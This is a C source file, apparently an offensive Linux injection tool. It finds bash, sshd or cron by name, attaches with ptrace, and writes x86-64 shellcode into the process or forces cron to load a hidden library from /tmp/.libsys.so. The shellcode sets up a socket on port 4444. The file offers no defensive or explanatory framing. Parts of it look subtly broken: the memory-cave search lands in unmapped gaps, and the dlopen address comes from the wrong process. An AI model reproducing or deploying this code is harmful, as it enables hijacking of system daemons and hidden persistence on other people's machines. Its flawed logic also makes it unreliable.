#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>
#include <dlfcn.h>
#include <sys/syscall.h>
#include <linux/elf.h>

typedef struct {
    unsigned long code_start;
    unsigned long code_end;
    unsigned long data_start;
    unsigned long data_end;
    unsigned long entry_point;
} process_memory_t;

int find_process(const char *name) {
    DIR *dir = opendir("/proc");
    if (!dir) return -1;
    
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR) continue;
        
        int pid = atoi(entry->d_name);
        if (pid <= 0) continue;
        
        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        
        char comm[64];
        ssize_t bytes = read(fd, comm, sizeof(comm) - 1);
        close(fd);
        
        if (bytes > 0) {
            comm[bytes] = '\0';
            char *newline = strchr(comm, '\n');
            if (newline) *newline = '\0';
            
            if (strcmp(comm, name) == 0) {
                closedir(dir);
                return pid;
            }
        }
    }
    closedir(dir);
    return -1;
}

int attach_to_process(int pid) {
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        return 0;
    }
    
    int status;
    waitpid(pid, &status, 0);
    
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 0;
    }
    
    return 1;
}

void *get_function_address(void *handle, const char *name) {
    return dlsym(handle, name);
}

unsigned long find_code_cave(int pid, size_t size) {
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    
    FILE *fp = fopen(maps_path, "r");
    if (!fp) return 0;
    
    char line[512];
    unsigned long address = 0;
    unsigned long cave_start = 0;
    unsigned long cave_size = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        unsigned long start, end;
        char perms[5];
        unsigned long offset;
        char dev[12];
        unsigned long inode;
        char path[256];
        
        if (sscanf(line, "%lx-%lx %4s %lx %s %lu %s", &start, &end, perms, &offset, dev, &inode, path) >= 6) {
            if (perms[2] == 'x') {
                unsigned long gap = start - (cave_start + cave_size);
                if (gap >= size) {
                    address = cave_start + cave_size;
                    break;
                }
                cave_start = end;
                cave_size = 0;
            } else if (cave_start == 0) {
                cave_start = start;
                cave_size += end - start;
            } else {
                cave_size += end - start;
            }
        }
    }
    
    fclose(fp);
    return address;
}

int inject_shellcode(int pid, void *shellcode, size_t shellcode_size) {
    if (!attach_to_process(pid)) return 0;
    
    unsigned long addr = find_code_cave(pid, shellcode_size);
    if (!addr) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 0;
    }
    
    struct user_regs_struct old_regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &old_regs);
    
    for (size_t i = 0; i < shellcode_size; i += sizeof(long)) {
        long word = 0;
        memcpy(&word, (char*)shellcode + i, sizeof(long) > shellcode_size - i ? shellcode_size - i : sizeof(long));
        ptrace(PTRACE_POKEDATA, pid, addr + i, word);
    }
    
    struct user_regs_struct regs = old_regs;
    regs.rip = addr;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    int status;
    waitpid(pid, &status, 0);
    
    ptrace(PTRACE_SETREGS, pid, NULL, &old_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    return 1;
}

int inject_dynamic_library(int pid, const char *lib_path) {
    if (!attach_to_process(pid)) return 0;
    
    void *dlopen_addr = get_function_address(NULL, "dlopen");
    if (!dlopen_addr) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 0;
    }
    
    size_t path_len = strlen(lib_path) + 1;
    unsigned long path_addr = find_code_cave(pid, path_len);
    if (!path_addr) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 0;
    }
    
    for (size_t i = 0; i < path_len; i += sizeof(long)) {
        long word = 0;
        memcpy(&word, lib_path + i, sizeof(long) > path_len - i ? path_len - i : sizeof(long));
        ptrace(PTRACE_POKEDATA, pid, path_addr + i, word);
    }
    
    struct user_regs_struct old_regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &old_regs);
    
    struct user_regs_struct regs = old_regs;
    regs.rax = 0;
    regs.rdi = path_addr;
    regs.rsi = 2;
    regs.rip = (unsigned long)dlopen_addr;
    
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    int status;
    waitpid(pid, &status, 0);
    
    ptrace(PTRACE_SETREGS, pid, NULL, &old_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    return 1;
}

unsigned char shellcode[] = {
    0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31,
    0xf6, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x6a,
    0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a,
    0x6a, 0x29, 0x58, 0x0f, 0x05, 0x49, 0x89, 0xc4,
    0x48, 0x31, 0xc0, 0x50, 0x66, 0x68, 0x11, 0x5c,
    0x66, 0x6a, 0x02, 0x48, 0x89, 0xe7, 0x48, 0x31,
    0xf6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f,
    0x05, 0x4c, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x6a,
    0x10, 0x5a, 0x6a, 0x2b, 0x58, 0x0f, 0x05
};

int inject_into_process(int target_type) {
    int pid = -1;
    
    switch(target_type) {
        case 1:
            pid = find_process("bash");
            break;
        case 2:
            pid = find_process("sshd");
            break;
        case 3:
            pid = find_process("cron");
            break;
        default:
            break;
    }
    
    if (pid < 0) return 0;
    
    if (target_type == 3) {
        return inject_dynamic_library(pid, "/tmp/.libsys.so");
    } else {
        return inject_shellcode(pid, shellcode, sizeof(shellcode));
    }
}